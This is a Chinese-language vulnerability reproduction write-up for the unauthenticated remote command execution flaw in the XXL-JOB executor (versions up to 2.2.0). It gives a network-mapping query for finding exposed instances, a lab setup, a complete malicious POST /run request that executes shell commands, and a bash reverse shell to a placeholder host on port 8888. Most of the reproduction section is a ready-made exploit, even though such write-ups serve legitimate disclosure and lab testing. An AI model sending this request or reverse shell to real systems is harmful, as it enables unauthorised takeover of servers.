# XXL-JOB executor 未授权访问漏洞

## 漏洞描述

XXL-JOB 是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。XXL-JOB 分为 admin 和 executor 两端，前者为后台管理页面，后者是任务执行的客户端。

由于 executor 默认没有配置认证，未授权的攻击者可以通过 RESTful API 执行任意命令。

参考链接：

- https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g
- https://landgrey.me/blog/18/
- https://github.com/OneSourceCat/XxlJob-Hessian-RCE

## 披露时间

```
2020-10-27
```

## 漏洞影响

```
XXL-JOB <= 2.2.0
```

## 网络测绘

```
app="XXL-JOB" || title="任务调度中心" || ("invalid request, HttpMethod not support" && port="9999")
```

## 环境搭建

Vulhub 执行如下命令启动 2.2.0 版本的 XXL-JOB：

```
docker-compose up -d
```

环境启动后，访问 `http://your-ip:8080/xxl-job-admin/toLogin` 即可查看到管理端（admin），访问 `http://your-ip:9999` 可以查看到客户端（executor）。客户端（executor）默认返回如下报错信息：

```
{"code":500,"msg":"invalid request, HttpMethod not support."}
```

![](images/XXL-JOB%20executor%20未授权访问漏洞/image-20241112145544060.png)

## 漏洞复现

向客户端（executor）发送如下数据包，即可执行命令：

```
POST /run HTTP/1.1
Host: your-ip:9999
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 365

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "touch /tmp/awesome_poc",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```

![](images/XXL-JOB%20executor%20未授权访问漏洞/image-20241112145829960.png)

`touch /tmp/awesome_poc` 已成功执行：

![](images/XXL-JOB%20executor%20未授权访问漏洞/image-20241112145810528.png)

执行反弹 shell 命令：

```
"glueSource": "bash -i >& /dev/tcp/your-ip/8888 0>&1 "
```

![](images/XXL-JOB%20executor%20未授权访问漏洞/image-20241112150237169.png)

监听 8888 端口，接收反弹 shell：

![](images/XXL-JOB%20executor%20未授权访问漏洞/image-20241112150213679.png)

低于 2.2.0 版本的 XXL-JOB 没有 RESTful API，我们可以通过 [Hessian反序列化](https://github.com/OneSourceCat/XxlJob-Hessian-RCE) 来执行命令。
